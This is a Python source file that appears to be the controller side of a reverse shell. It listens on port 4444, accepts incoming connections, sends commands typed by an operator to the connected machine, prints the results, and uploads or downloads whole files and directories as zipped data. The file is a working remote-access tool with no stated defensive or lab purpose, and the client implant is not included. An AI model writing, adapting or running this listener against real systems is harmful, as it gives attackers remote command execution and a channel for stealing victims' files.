import socket
import os
import zipfile
import io
import struct

HOST = "0.0.0.0"
PORT = 4444
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

def send_message(sock, message):
    """Send a length-prefixed message"""
    try:
        # Send size first
        message_len = len(message)
        sock.send(struct.pack('!Q', message_len))
        
        # Send data in chunks
        total_sent = 0
        while total_sent < message_len:
            sent = sock.send(message[total_sent:total_sent + BUFFER_SIZE])
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            total_sent += sent
            
    except Exception as e:
        raise RuntimeError(f"Send failed: {str(e)}")

def receive_message(sock):
    """Receive a length-prefixed message"""
    try:
        # Get message size first
        size_data = sock.recv(8)
        if not size_data:
            return None
        message_len = struct.unpack('!Q', size_data)[0]
        
        # Receive data in chunks
        chunks = []
        bytes_received = 0
        while bytes_received < message_len:
            chunk = sock.recv(min(message_len - bytes_received, BUFFER_SIZE))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_received += len(chunk)
            
        return b''.join(chunks)
        
    except Exception as e:
        raise RuntimeError(f"Receive failed: {str(e)}")

def create_zip_file(path):
    """Create a zip file containing a directory"""
    temp_zip = io.BytesIO()
    with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.isfile(path):
            # Single file
            zipf.write(path, os.path.basename(path))
        else:
            # Directory
            for root, _, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(path))
                    zipf.write(file_path, arcname)
    return temp_zip.getvalue()

def extract_zip_file(zip_data, extract_path):
    """Extract a zip file to the specified path"""
    with io.BytesIO(zip_data) as zip_buffer:
        with zipfile.ZipFile(zip_buffer) as zip_file:
            zip_file.extractall(extract_path)

def handle_file_transfer(sock, path, mode='upload'):
    try:
        if mode == 'upload':
            if not os.path.exists(path):
                print(f"Path {path} does not exist")
                return False
                
            # Create zip for both files and directories
            print(f"Zipping {path}...")
            zip_data = create_zip_file(path)
            
            print("Sending data...")
            send_message(sock, zip_data)
            print("Data sent successfully")
            return True
            
        else:  # download
            print(f"Receiving data for {path}...")
            data = receive_message(sock)
            if not data:
                print("No data received")
                return False
                
            parent_dir = os.path.dirname(path)
            if parent_dir:
                os.makedirs(parent_dir, exist_ok=True)
                
            try:
                # Try to extract as zip
                extract_zip_file(data, os.path.dirname(path) if os.path.dirname(path) else '.')
                print(f"Successfully extracted to {path}")
            except zipfile.BadZipFile:
                # Not a zip, treat as single file
                with open(path, 'wb') as f:
                    f.write(data)
                print(f"Successfully saved file {path}")
                
            return True
            
    except Exception as e:
        print(f"Transfer failed: {str(e)}")
        return False

def main():
    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f'Listening on {HOST}:{PORT}...')

    while True:
        client_socket, client_address = server_socket.accept()
        print(f'Connected to {client_address[0]}:{client_address[1]}')
        
        try:
            cwd = receive_message(client_socket)
            if not cwd:
                raise RuntimeError("Failed to receive working directory")
            cwd = cwd.decode()
            print(f'Working directory: {cwd}')
            
            while True:
                command = input(f"{cwd} $> ").strip()
                
                if not command:
                    continue
                    
                send_message(client_socket, command.encode())
                
                if command.lower() == "exit":
                    break
                    
                split_command = command.split()
                command_type = split_command[0].lower() if split_command else ""
                
                if command_type in ("upload", "download"):
                    if len(split_command) < 2:
                        print("Missing file path")
                        continue
                        
                    success = handle_file_transfer(
                        client_socket,
                        split_command[1],
                        command_type
                    )
                    
                    if not success:
                        continue
                
                response = receive_message(client_socket)
                if not response:
                    raise RuntimeError("Failed to receive response")
                    
                output, cwd = response.decode().split(SEPARATOR)
                if output:
                    print(output)
                    
        except Exception as e:
            print(f"Error: {e}")
            print("Waiting for new connection...")
            
        finally:
            client_socket.close()

if __name__ == "__main__":
    main()